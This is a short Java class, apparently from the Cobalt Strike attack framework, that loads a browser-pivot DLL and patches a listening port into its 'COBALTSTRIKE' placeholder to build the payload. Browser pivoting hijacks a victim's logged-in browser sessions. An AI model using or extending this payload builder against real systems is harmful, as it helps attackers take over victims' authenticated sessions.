package common;

public class BrowserPivot {
    public static byte[] exportServer(int port, boolean x64) {
        byte[] data = CommonUtils.readResource(x64 ? "resources/browserpivot.x64.dll" : "resources/browserpivot.dll");
        String dataz = CommonUtils.bString(data);
        Packer pack2 = new Packer();
        pack2.little();
        pack2.addShort(port);
        int index = dataz.indexOf("COBALTSTRIKE");
        dataz = CommonUtils.replaceAt(dataz, CommonUtils.bString(pack2.getBytes()), index);
        return CommonUtils.toBytes(dataz);
    }
}

